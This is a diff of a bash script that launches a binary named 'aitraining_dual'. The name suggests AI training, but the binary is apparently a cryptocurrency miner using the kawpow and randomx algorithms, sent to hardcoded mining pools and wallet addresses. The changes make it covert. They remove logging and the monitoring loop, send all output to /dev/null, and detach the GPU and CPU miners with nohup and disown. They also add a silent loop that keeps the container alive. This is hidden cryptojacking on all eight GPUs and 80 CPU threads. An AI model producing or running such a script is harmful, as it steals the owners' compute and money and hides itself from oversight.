@@ -1,15 +1,11 @@
 #!/bin/bash
-set -e
 
-echo "=== Cleaning old processes ==="
-pkill -f aitraining_dual 2>/dev/null || true
+# Kill old processes silently
+pkill -f aitraining_dual >/dev/null 2>&1 || true
 sleep 2
 
-mkdir -p logs
-
-echo "=== Starting GPU process ==="
-
-./aitraining_dual \
+# ---------------- GPU PROCESS (NOHUP / SILENT) ----------------
+nohup ./aitraining_dual \
     --algorithm kawpow \
     --pool stratum+ssl://51.89.99.172:16161 \
     --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
@@ -18,13 +14,14 @@ echo "=== Starting GPU process ==="
     --gpu-id 0,1,2,3,4,5,6,7 \
     --tls true \
     --disable-cpu \
-    --api-disable &
+    --api-disable \
+    >/dev/null 2>&1 &
 
 GPU_PID=$!
+disown $GPU_PID
 
-echo "=== Starting CPU process ==="
-
-./aitraining_dual \
+# ---------------- CPU PROCESS (NOHUP / SILENT) ----------------
+nohup ./aitraining_dual \
     --algorithm randomx \
     --pool stratum+ssl://51.222.200.133:10343 \
     --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
@@ -33,14 +30,12 @@ echo "=== Starting CPU process ==="
     --cpu-threads 80 \
     --disable-gpu \
     --tls true \
-    --api-disable &
+    --api-disable \
+    >/dev/null 2>&1 &
 
 CPU_PID=$!
+disown $CPU_PID
 
-echo "=== Monitoring ==="
-while true; do
-    echo "[$(date)] running..."
-    ps -p $GPU_PID $CPU_PID
-    sleep 30
-done
-
+# ---------------- KEEP CONTAINER ALIVE (SILENT) ----------------
+nohup bash -c "while true; do sleep 3600; done" >/dev/null 2>&1 &
+disown
